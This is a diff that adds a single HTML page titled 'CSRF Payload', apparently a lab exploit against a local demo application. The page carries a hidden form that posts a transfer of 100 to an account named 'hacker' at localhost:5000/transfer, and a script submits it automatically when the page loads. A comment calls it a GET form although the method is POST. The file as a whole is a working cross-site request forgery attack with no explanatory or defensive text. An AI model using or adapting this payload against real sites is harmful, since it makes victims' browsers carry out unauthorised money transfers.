@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Payload</title>
+</head>
+<body>
+    <h1>CSRF Attack in Progress</h1>
+    <p>If you see this, the attack may have succeeded.</p>
+    <!-- CSRF payload: Auto-submit GET form to transfer money -->
+    <form action="http://localhost:5000/transfer" method="POST" style="display:none;">
+        <input type="hidden" name="amount" value="100">
+        <input type="hidden" name="to_account" value="hacker">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
